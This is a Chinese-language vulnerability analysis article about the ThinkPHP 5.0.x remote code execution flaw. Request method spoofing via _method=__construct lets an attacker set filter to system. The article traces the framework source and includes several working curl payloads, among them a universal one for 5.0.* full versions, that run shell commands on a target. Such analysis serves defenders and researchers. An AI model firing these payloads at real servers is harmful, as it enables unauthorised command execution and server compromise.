\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/DJ\_atteqyMdEv8753pdJqA)

payload:

```
需要开启debug版本:
payload1:
第一次执行system:
curl -v -d "\_method=\_\_construct&filter\[\]=system" "http://localhost/think/public/index.php?a=dir"

payload2:
第二次执行system:
curl -d "\_method=\_\_construct&filter\[\]=system&method=get&server\[REQUEST\_METHOD\]=ls -al" http://localhost/think/public/index.php

不需要开启debug版本，但需要是完整版，很容易满足:
 curl -v -d "\_method=\_\_construct&filter\[\]=system&method=get&server\[REQUEST\_METHOD\]=dir" "http://localhost/loudong/public/index.php?s=captcha&a=dir"

5.0.13之前比较特殊,既不需要开启debug,也不要求是完整版：
 curl -v -d "\_method=\_\_construct&filter\[\]=system&method=get" "http://localhost/loudong/public/index.php?s=index/index/index&a=dir"
```

  

---

Thinkphp5.0.23 核心板为例

  

  

**该版本只能在开启 Debug 模式下，实现 RCE.**  

config.php:

```
.................................
// 表单请求类型伪装变量
'var\_method'             => '\_method',
.................................
```

Request.php 中的 method 方法:

```
public function method($method = false)
    {
        if (true === $method) {
            // 获取原始请求类型
            return $this->server('REQUEST\_METHOD') ?: 'GET';
        } elseif (!$this->method) {
            if (isset($\_POST\[Config::get('var\_method')\])) { // 相当于 $\_POST\['\_method'\]
                $this->method = strtoupper($\_POST\[Config::get('var\_method')\]);
                $this->{$this->method}($\_POST);
            } elseif (isset($\_SERVER\['HTTP\_X\_HTTP\_METHOD\_OVERRIDE'\])) {
                $this->method = strtoupper($\_SERVER\['HTTP\_X\_HTTP\_METHOD\_OVERRIDE'\]);
            } else {
                $this->method = $this->server('REQUEST\_METHOD') ?: 'GET';
            }
        }
        return $this->method;
    }
```

构造函数：

```
protected function \_\_construct($options = \[\])
    {
        foreach ($options as $name => $item) {
            if (property\_exists($this, $name)) {
                $this->$name = $item;
            }
        }
        if (is\_null($this->filter)) {
            $this->filter = Config::get('default\_filter');
        }

        // 保存 php://input
        $this->input = file\_get\_contents('php://input');
    }
```

遍历所有参数，如果是类属性，则对该类对应属性赋值。

在 App 类（thinkphp/library/think/App.php）中 module 方法增加了设置 filter 参数值的代码，用于初始化 filter。因此通过上述请求设置的 filter 参数值会被重新覆盖为空导致无法利用。

在启动 Debug 模式之后，会调用 param 方法：

param 方法:

```
public function param($name = '', $default = null, $filter = '')
    {
        if (empty($this->mergeParam)) {
            $method = $this->method(true);
            // 自动获取请求变量
            switch ($method) {
                case 'POST':
                    $vars = $this->post(false);
                    break;
                case 'PUT':
                case 'DELETE':
                case 'PATCH':
                    $vars = $this->put(false);
                    break;
                default:
                    $vars = \[\];
            }
            // 当前请求参数和URL地址中的参数合并
            $this->param      = array\_merge($this->param, $this->get(false), $vars, $this->route(false));
            $this->mergeParam = true;
        }
        if (true === $name) {
            // 获取包含文件上传信息的数组
            $file = $this->file();
            $data = is\_array($file) ? array\_merge($this->param, $file) : $this->param;
            return $this->input($data, '', $default, $filter);
        }
        return $this->input($this->param, $name, $default, $filter);
    }
```

param 方法首先会调用`$method = $this->method(true);`:

server 方法:

```
public function server($name = '', $default = null, $filter = '')
    {
        if (empty($this->server)) {
            $this->server = $\_SERVER;
        }
        if (is\_array($name)) {
            return $this->server = array\_merge($this->server, $name);
        }
        //在当前payload下，第一次执行该方法时，$this->server= \['REQUEST\_METHOD' => 'dir'\]
        return $this->input($this->server, false === $name ? false : strtoupper($name), $default, $filter);
    }
```

server 方法会调用 input 方法:

```
public function input($data = \[\], $name = '', $default = null, $filter = '')
   {
       ...................................
       // 解析过滤器
       $filter = $this->getFilter($filter, $default);

       if (is\_array($data)) {
           array\_walk\_recursive($data, \[$this, 'filterValue'\], $filter);
           reset($data);
       } else {
           $this->filterValue($data, $name, $filter);
       }

     ..............................................
   }
```

这里`$filter = $this->getFilter($filter, $default);`调用`getFilter`方法:

```
protected function getFilter($filter, $default)
    {
        if (is\_null($filter)) {
            $filter = \[\];
        } else {
            $filter = $filter ?: $this->filter;
            if (is\_string($filter) && false === strpos($filter, '/')) {
                $filter = explode(',', $filter);
            } else {
                $filter = (array) $filter;
            }
        }

        $filter\[\] = $default;
        return $filter;
    }
```

可以看到这里如果`$filter`为空，就会对`$filter`进行赋值，也就是`$this->filter`，可以控制。

至此，可构造 payload:

```
curl -d "\_method=\_\_construct&filter\[\]=system&server\[REQUEST\_METHOD\]=ls -al" http://localhost/think/public/index.php
```

继续看，

param 函数最终会调用 input 方法:

```
public function param($name = '', $default = null, $filter = '')
    {
      .........................................
        return $this->input($this->param, $name, $default, $filter);
    }
```

`$this->param` 就是`get`参数，参数名无所谓:

构造 payload:

```
curl -d "\_method=\_\_construct&filter\[\]=system" http://localhost/think/public/index.php?a=dir
```

  
  

------

Thinkphp5.0.22 完整板为例:

  

  

**该版本可以在不开启 Debug 模式的情况下实现 RCE**  

run 方法:

```
public static function run(Request $request = null)
    {
        $request = is\_null($request) ? Request::instance() : $request;

        try {
            $config = self::initCommon();

            // 模块/控制器绑定
            if (defined('BIND\_MODULE')) {
                BIND\_MODULE && Route::bind(BIND\_MODULE);
            } elseif ($config\['auto\_bind\_module'\]) {
                // 入口自动绑定
                $name = pathinfo($request->baseFile(), PATHINFO\_FILENAME);
                if ($name && 'index' != $name && is\_dir(APP\_PATH . $name)) {
                    Route::bind($name);
                }
            }

            $request->filter($config\['default\_filter'\]);

            // 默认语言
            Lang::range($config\['default\_lang'\]);
            // 开启多语言机制 检测当前语言
            $config\['lang\_switch\_on'\] && Lang::detect();
            $request->langset(Lang::range());

            // 加载系统语言包
            Lang::load(\[
                THINK\_PATH . 'lang' . DS . $request->langset() . EXT,
                APP\_PATH . 'lang' . DS . $request->langset() . EXT,
            \]);

            // 监听 app\_dispatch
            Hook::listen('app\_dispatch', self::$dispatch);
            // 获取应用调度信息
            $dispatch = self::$dispatch;

            // 未设置调度信息则进行 URL 路由检测
            if (empty($dispatch)) {
                $dispatch = self::routeCheck($request, $config);
            }

            // 记录当前调度信息
            $request->dispatch($dispatch);

            // 记录路由和请求信息
            if (self::$debug) {
                Log::record('\[ ROUTE \] ' . var\_export($dispatch, true), 'info');
                Log::record('\[ HEADER \] ' . var\_export($request->header(), true), 'info');
                Log::record('\[ PARAM \] ' . var\_export($request->param(), true), 'info');
            }

            // 监听 app\_begin
            Hook::listen('app\_begin', $dispatch);

            // 请求缓存检查
            $request->cache(
                $config\['request\_cache'\],
                $config\['request\_cache\_expire'\],
                $config\['request\_cache\_except'\]
            );

            $data = self::exec($dispatch, $config);
        } catch (HttpResponseException $exception) {
            $data = $exception->getResponse();
        }

        // 清空类的实例化
        Loader::clearInstance();

        // 输出数据到客户端
        if ($data instanceof Response) {
            $response = $data;
        } elseif (!is\_null($data)) {
            // 默认自动识别响应输出类型
            $type = $request->isAjax() ?
            Config::get('default\_ajax\_return') :
            Config::get('default\_return\_type');

            $response = Response::create($data, $type);
        } else {
            $response = Response::create();
        }

        // 监听 app\_end
        Hook::listen('app\_end', $response);

        return $response;
    }
```

// 未设置调度信息则进行 URL 路由检测, 调用了`$dispatch = self::routeCheck($request, $config);`

routeCheck 方法:

```
public static function routeCheck($request, array $config)
    {
        //path 可通过s参数获得
        $path   = $request->path();
        $depr   = $config\['pathinfo\_depr'\];
        $result = false;

        // 路由检测
        $check = !is\_null(self::$routeCheck) ? self::$routeCheck : $config\['url\_route\_on'\];
        if ($check) {
            // 开启路由
            if (is\_file(RUNTIME\_PATH . 'route.php')) {
                // 读取路由缓存
                $rules = include RUNTIME\_PATH . 'route.php';
                is\_array($rules) && Route::rules($rules);
            } else {
                $files = $config\['route\_config\_file'\];
                foreach ($files as $file) {
                    if (is\_file(CONF\_PATH . $file . CONF\_EXT)) {
                        // 导入路由配置
                        $rules = include CONF\_PATH . $file . CONF\_EXT;
                        is\_array($rules) && Route::import($rules);
                    }
                }
            }

            // 路由检测（根据路由定义返回不同的URL调度）
            $result = Route::check($request, $path, $depr, $config\['url\_domain\_deploy'\]);
            $must   = !is\_null(self::$routeMust) ? self::$routeMust : $config\['url\_route\_must'\];

            if ($must && false === $result) {
                // 路由无效
                throw new RouteNotFoundException();
            }
        }

        // 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索
        if (false === $result) {
            $result = Route::parseUrl($path, $depr, $config\['controller\_auto\_search'\]);
        }

        return $result;
    }
```

`$result = Route::check($request, $path, $depr, $config['url_domain_deploy']);`

check 方法:

```
public static function check($request, $url, $depr = '/', $checkDomain = false)
    {
       。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
        $method = strtolower($request->method());
        // 获取当前请求类型的路由规则
        $rules = isset(self::$rules\[$method\]) ? self::$rules\[$method\] : \[\];
        // 检测域名部署
        if ($checkDomain) {
            self::checkDomain($request, $rules, $method);
        }
        // 检测URL绑定
        $return = self::checkUrlBind($url, $rules, $depr);
        if (false !== $return) {
            return $return;
        }
        if ('|' != $url) {
            $url = rtrim($url, '|');
        }
        $item = str\_replace('|', '/', $url);
        if (isset($rules\[$item\])) {
            // 静态路由规则检测
            $rule = $rules\[$item\];
            if (true === $rule) {
                $rule = self::getRouteExpress($item);
            }
            if (!empty($rule\['route'\]) && self::checkOption($rule\['option'\], $request)) {
                self::setOption($rule\['option'\]);
                return self::parseRule($item, $rule\['route'\], $url, $rule\['option'\]);
            }
        }

        // 路由规则检测
        if (!empty($rules)) {
            return self::checkRoute($request, $rules, $url, $depr);
        }
        return false;
    }
```

`$method = strtolower($request->method());`这里的`$method`可以通过传递参数`method`控制。

最终会进入路由规则检测：

```
// 路由规则检测
        if (!empty($rules)) {
            return self::checkRoute($request, $rules, $url, $depr);
        }
```

checkRoute 方法:  

```
private static function checkRoute($request, $rules, $url, $depr = '/', $group = '', $options = \[\])
    {
        foreach ($rules as $key => $item) {
            if (true === $item) {
                $item = self::getRouteExpress($key);
            }
            if (!isset($item\['rule'\])) {
                continue;
            }
            $rule    = $item\['rule'\];
            $route   = $item\['route'\];
            $vars    = $item\['var'\];
            $option  = $item\['option'\];
            $pattern = $item\['pattern'\];

            // 检查参数有效性
            if (!self::checkOption($option, $request)) {
                continue;
            }

            if (isset($option\['ext'\])) {
                // 路由ext参数 优先于系统配置的URL伪静态后缀参数
                $url = preg\_replace('/\\.' . $request->ext() . '$/i', '', $url);
            }

            if (is\_array($rule)) {
                // 分组路由
                $pos = strpos(str\_replace('<', ':', $key), ':');
                if (false !== $pos) {
                    $str = substr($key, 0, $pos);
                } else {
                    $str = $key;
                }
                if (is\_string($str) && $str && 0 !== stripos(str\_replace('|', '/', $url), $str)) {
                    continue;
                }
                self::setOption($option);
                $result = self::checkRoute($request, $rule, $url, $depr, $key, $option);
                if (false !== $result) {
                    return $result;
                }
            } elseif ($route) {
                if ('\_\_miss\_\_' == $rule || '\_\_auto\_\_' == $rule) {
                    // 指定特殊路由
                    $var    = trim($rule, '\_\_');
                    ${$var} = $item;
                    continue;
                }
                if ($group) {
                    $rule = $group . ($rule ? '/' . ltrim($rule, '/') : '');
                }

                self::setOption($option);
                if (isset($options\['bind\_model'\]) && isset($option\['bind\_model'\])) {
                    $option\['bind\_model'\] = array\_merge($options\['bind\_model'\], $option\['bind\_model'\]);
                }
                $result = self::checkRule($rule, $route, $url, $pattern, $option, $depr);
                if (false !== $result) {
                    return $result;
                }
            }
        }
        if (isset($auto)) {
            // 自动解析URL地址
            return self::parseUrl($auto\['route'\] . '/' . $url, $depr);
        } elseif (isset($miss)) {
            // 未匹配所有路由的路由规则处理
            return self::parseRule('', $miss\['route'\], $url, $miss\['option'\]);
        }
        return false;
    }
```

这里有效的 route 除了一些默认的之外, 就有完整版中才有的`captcha`。

默认的 route 最终会调用 moudle 函数，其中调用`$request->filter($config['default_filter']);`清空了 filter 导致漏洞利用失败。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09w6Xth5xWIzupiaShFgnQmsXZVBWgXTSAhcS2GfWQgeu5O5n2hjqWKybaKDPucZGNFzfUujLWON4g/640?wx_fmt=png)

```
<?php
\\think\\Route::get('captcha/\[:id\]', "\\\\think\\\\captcha\\\\CaptchaController@index");

\\think\\Validate::extend('captcha', function ($value, $id = "") {
    return captcha\_check($value, $id, (array)\\think\\Config::get('captcha'));
});

\\think\\Validate::setTypeMsg('captcha', '验证码错误!');
```

所以，需要传入`s=captcha` 并且`method=get`。

由于`返回值$dispatch['type']='method'`，最终会调用`param`方法，就和开启 debug 模式一样了。

最终，5.0.\* 完整版，默认即可，通杀 payload:

```
curl -v -d "\_method=\_\_construct&filter\[\]=system&method=get&server\[REQUEST\_METHOD\]=dir" "http://localhost/loudong/public/index.php?s=captcha&a=dir"
```

end

  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09w6Xth5xWIzupiaShFgnQms2XKNvgFv6Oyg3ibhs1GQolo6OiaEZGdpjZtllZqyibkK0lKs1iclgSgSHA/640?wx_fmt=png)